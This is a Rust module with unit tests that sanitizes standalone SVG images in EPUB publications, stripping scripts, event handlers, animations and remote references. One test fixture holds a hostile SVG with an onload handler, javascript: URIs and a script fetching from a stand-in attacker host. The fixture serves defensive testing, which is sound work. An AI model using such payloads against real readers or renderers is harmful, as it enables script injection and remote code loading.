use super::resources::PublicationResourceIndex;
use super::sanitizer::{
    sanitize_xhtml, without_xml_declaration, SanitizationError, SanitizationLimits,
    SanitizedContent, CONTENT_POLICY_VERSION,
};
use kuchikiki::traits::TendrilSink;

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum SvgSanitizationError {
    #[error(transparent)]
    Content(#[from] SanitizationError),
    #[error("standalone SVG must contain exactly one SVG root")]
    InvalidRoot,
}

pub fn sanitize_svg(
    bytes: &[u8],
    resource_href: &str,
    resources: &PublicationResourceIndex,
    policy_version: u32,
    limits: SanitizationLimits,
) -> Result<SanitizedContent, SvgSanitizationError> {
    if policy_version != CONTENT_POLICY_VERSION {
        return Err(SanitizationError::UnsupportedPolicy(policy_version).into());
    }
    if bytes.len() > limits.max_input_bytes {
        return Err(SanitizationError::InputTooLarge {
            actual: bytes.len(),
            limit: limits.max_input_bytes,
        }
        .into());
    }
    let source = std::str::from_utf8(bytes).map_err(|_| SanitizationError::InvalidEncoding)?;
    let source = without_xml_declaration(source);
    let wrapped =
        format!("<!doctype html><html><head><title></title></head><body>{source}</body></html>");
    let sanitized = sanitize_xhtml(
        wrapped.as_bytes(),
        resource_href,
        resources,
        policy_version,
        SanitizationLimits {
            max_input_bytes: wrapped.len(),
            max_nodes: limits.max_nodes,
        },
    )?;
    let serialized_document =
        std::str::from_utf8(&sanitized.bytes).map_err(|_| SanitizationError::InvalidEncoding)?;
    let parsed = kuchikiki::parse_html().one(serialized_document);
    let document = parsed.document_node;
    let body = document
        .select_first("body")
        .map_err(|_| SvgSanitizationError::InvalidRoot)?;
    let mut roots = Vec::new();
    let mut has_non_whitespace_text = false;
    for child in body.as_node().children() {
        if let Some(element) = child.as_element() {
            roots.push((
                child.clone(),
                element.name.local.to_string(),
                element.name.ns.to_string(),
            ));
        } else if child
            .as_text()
            .is_some_and(|text| !text.borrow().trim().is_empty())
        {
            has_non_whitespace_text = true;
        }
    }
    if has_non_whitespace_text || roots.len() != 1 {
        return Err(SvgSanitizationError::InvalidRoot);
    }
    let (root, local_name, namespace) = roots.pop().expect("root count was checked");
    if !local_name.eq_ignore_ascii_case("svg") || namespace != "http://www.w3.org/2000/svg" {
        return Err(SvgSanitizationError::InvalidRoot);
    }

    let mut output = Vec::new();
    root.serialize(&mut output)
        .map_err(|error| SanitizationError::Serialization(error.to_string()))?;
    Ok(SanitizedContent {
        bytes: output,
        media_type: "image/svg+xml".into(),
        encoding: sanitized.encoding,
        policy_version: sanitized.policy_version,
        status: sanitized.status,
        diagnostics: sanitized.diagnostics,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::publication::sanitizer::SanitizationStatus;
    use std::io::Read;
    use std::path::PathBuf;

    fn resources() -> PublicationResourceIndex {
        PublicationResourceIndex::new([
            "EPUB/images/diagram.svg",
            "EPUB/images/cover.png",
            "EPUB/images/icon.svg",
        ])
        .unwrap()
    }

    fn text(result: &SanitizedContent) -> String {
        String::from_utf8(result.bytes.clone()).unwrap()
    }

    fn diagnostic_count(result: &SanitizedContent, code: &str) -> u32 {
        result
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == code)
            .map_or(0, |diagnostic| diagnostic.count)
    }

    #[test]
    fn preserves_the_registered_safe_standalone_svg_fixture() {
        let fixture = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../tests/fixtures/epub/minimal-epub3.epub");
        let mut archive = zip::ZipArchive::new(std::fs::File::open(fixture).unwrap()).unwrap();
        let mut source = Vec::new();
        archive
            .by_name("EPUB/image.svg")
            .unwrap()
            .read_to_end(&mut source)
            .unwrap();
        let fixture_resources = PublicationResourceIndex::new([
            "EPUB/chapter.xhtml",
            "EPUB/image.svg",
            "EPUB/nav.xhtml",
            "EPUB/package.opf",
            "META-INF/container.xml",
            "mimetype",
        ])
        .unwrap();

        let result = sanitize_svg(
            &source,
            "EPUB/image.svg",
            &fixture_resources,
            CONTENT_POLICY_VERSION,
            SanitizationLimits::default(),
        )
        .unwrap();
        let output = text(&result);

        assert_eq!(result.status, SanitizationStatus::Exact);
        assert!(result.diagnostics.is_empty());
        assert!(output.starts_with("<svg"));
        assert!(output.ends_with("</svg>"));
        assert!(output.contains("<rect"));
        assert!(!output.contains("<html"));
    }

    #[test]
    fn removes_svg_active_content_navigation_animation_and_unsafe_references() {
        let source = br#"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" onload="pwn()">
          <title>Safe diagram</title><desc>Accessible description</desc>
          <defs><linearGradient id="paint"><stop offset="0" stop-color="red"/></linearGradient></defs>
          <rect width="10" height="10" fill="url(#paint)"/>
          <script>fetch('https://attacker.invalid/script')</script>
          <foreignObject><div>active HTML</div></foreignObject>
          <animate attributeName="href" values="javascript:pwn()"/>
          <set attributeName="onload" to="pwn()"/>
          <a href="https://attacker.invalid/navigation"><text>Preserved label</text></a>
          <image id="remote" href="https://attacker.invalid/image.png"/>
          <image id="local" href="cover.png"/>
          <use href="javascript:pwn()"/><circle id="paint" cx="10" cy="10" r="8" filter="url(https://attacker.invalid/filter.svg#x)"/>
        </svg>"#;
        let result = sanitize_svg(
            source,
            "EPUB/images/diagram.svg",
            &resources(),
            CONTENT_POLICY_VERSION,
            SanitizationLimits::default(),
        )
        .unwrap();
        let output = text(&result);

        for preserved in [
            "Safe diagram",
            "Accessible description",
            "linearGradient",
            "fill=\"url(#paint)\"",
            "Preserved label",
            "cover.png",
            "<circle",
        ] {
            assert!(output.contains(preserved), "safe SVG was lost: {preserved}");
        }
        for removed in [
            "<script",
            "foreignObject",
            "<animate",
            "<set",
            "onload",
            "attacker.invalid",
            "javascript:",
            "filter=",
            "<a ",
        ] {
            assert!(!output.contains(removed), "active SVG survived: {removed}");
        }
        assert_eq!(result.status, SanitizationStatus::Degraded);
        assert!(diagnostic_count(&result, "publication.svg_content_removed") >= 5);
        assert_eq!(
            diagnostic_count(&result, "publication.duplicate_id_removed"),
            1
        );
    }

    #[test]
    fn recovers_malformed_svg_deterministically_without_raw_fallback() {
        let malformed = b"<svg xmlns='http://www.w3.org/2000/svg'><text>Readable<script>pwn()";
        let first = sanitize_svg(
            malformed,
            "EPUB/images/diagram.svg",
            &resources(),
            CONTENT_POLICY_VERSION,
            SanitizationLimits::default(),
        )
        .unwrap();
        let second = sanitize_svg(
            malformed,
            "EPUB/images/diagram.svg",
            &resources(),
            CONTENT_POLICY_VERSION,
            SanitizationLimits::default(),
        )
        .unwrap();

        assert_eq!(first, second);
        assert!(text(&first).contains("Readable"));
        assert!(!text(&first).contains("<script"));
        assert!(diagnostic_count(&first, "publication.markup_recovered") >= 1);
    }

    #[test]
    fn refuses_non_svg_multiple_roots_and_common_content_boundaries() {
        for invalid in [
            b"<html><body>not SVG</body></html>".as_slice(),
            b"<svg></svg><svg></svg>".as_slice(),
            b"plain text".as_slice(),
        ] {
            assert_eq!(
                sanitize_svg(
                    invalid,
                    "EPUB/images/diagram.svg",
                    &resources(),
                    CONTENT_POLICY_VERSION,
                    SanitizationLimits::default(),
                )
                .unwrap_err(),
                SvgSanitizationError::InvalidRoot
            );
        }
        assert_eq!(
            sanitize_svg(
                &[0xff],
                "EPUB/images/diagram.svg",
                &resources(),
                CONTENT_POLICY_VERSION,
                SanitizationLimits::default(),
            )
            .unwrap_err(),
            SvgSanitizationError::Content(SanitizationError::InvalidEncoding)
        );
        assert!(matches!(
            sanitize_svg(
                b"<svg><g><circle/></g></svg>",
                "EPUB/images/diagram.svg",
                &resources(),
                CONTENT_POLICY_VERSION,
                SanitizationLimits {
                    max_input_bytes: 1024,
                    max_nodes: 3
                },
            ),
            Err(SvgSanitizationError::Content(
                SanitizationError::TooManyNodes { .. }
            ))
        ));
        assert_eq!(
            sanitize_svg(
                b"<svg/>",
                "EPUB/images/diagram.svg",
                &resources(),
                0,
                SanitizationLimits::default(),
            )
            .unwrap_err(),
            SvgSanitizationError::Content(SanitizationError::UnsupportedPolicy(0))
        );
    }
}
